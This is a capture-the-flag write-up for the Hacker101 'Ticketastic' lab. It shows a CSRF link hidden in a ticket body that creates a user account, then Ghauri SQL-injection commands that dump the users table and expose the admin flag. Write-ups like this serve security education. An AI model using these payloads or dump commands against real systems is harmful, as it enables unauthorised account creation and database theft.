# 🎫 Ticketastic: Live Instance

> **Platform:** Hacker101 CTF &nbsp;|&nbsp; **Difficulty:** `Moderate` &nbsp;|&nbsp; **Flags:** `2/2` ✅

---

## ⛓️ Attack Chain

```
CSRF via ticket body → Create new user → Login → SQL Injection on ticket ID → Dump users table → Flag in admin password
```

---

## 🔍 Application Overview

A ticketing system where anyone can submit a support ticket without being logged in. The ticket body renders raw HTML with zero sanitization — enabling CSRF. Once inside, the ticket viewer at `/ticket?id=` is vulnerable to SQL injection.

---

## 🚩 Flag 0 — CSRF to Create a New User

The `newUser` endpoint accepts credentials via a GET request with no CSRF token:

```
/newUser?username=user1&password=pass1&password2=pass1
```

Inject this link inside the body of a new ticket:

```html
<a href="http://localhost/newUser?username=hcini&password=ooooooo&password2=ooooooo">click</a>
```

When the admin opens the ticket, the request fires server-side and creates the account. Login with those credentials. Flag appears on login.

---

## 🚩 Flag 1 — SQL Injection on Ticket ID

The `/ticket?id=` parameter is injectable. Used Ghauri to enumerate the database:

```bash
ghauri -r req2.txt --dbs
# Found: level7, mysql, information_schema, performance_schema

ghauri -r req2.txt -D level7 --dump --batch --time-sec=2 --threads=10
```

**Database:** `level7` &nbsp;|&nbsp; **Tables:** `users`, `tickets`

Ghauri dumped the `users` table:

```
+----+----------+------------------------------------------------------------------+
| id | username | password                                                         |
+----+----------+------------------------------------------------------------------+
| 1  | admin    | ^FLAG^589f3fea5fc3dcb3fc076d8286b84efa8af4628c624b4ba01574e0...  |
| 2  | hcini    | ooooooo                                                          |
+----+----------+------------------------------------------------------------------+
```

Flag was stored as the admin's password in plaintext.

> **Injection types confirmed by Ghauri:**
> - Error-based (MySQL FLOOR)
> - Boolean-based blind
> - Time-based blind

---

## 🧠 Why It Works

| Vulnerability | Root Cause |
|---|---|
| CSRF | `newUser` uses GET with no token — any rendered link triggers it |
| Stored HTML Injection | Ticket body renders raw HTML, no sanitization |
| SQL Injection | `ticket?id=` built via string concatenation, no prepared statements |

---

## 📋 Payloads

```
# Flag 0 — CSRF link injected in ticket body
<a href="http://localhost/newUser?username=hcini&password=ooooooo&password2=ooooooo">click</a>

# Flag 1 — Ghauri enumeration
ghauri -r req2.txt --dbs
ghauri -r req2.txt -D level7 --dump --batch --time-sec=2 --threads=10
```
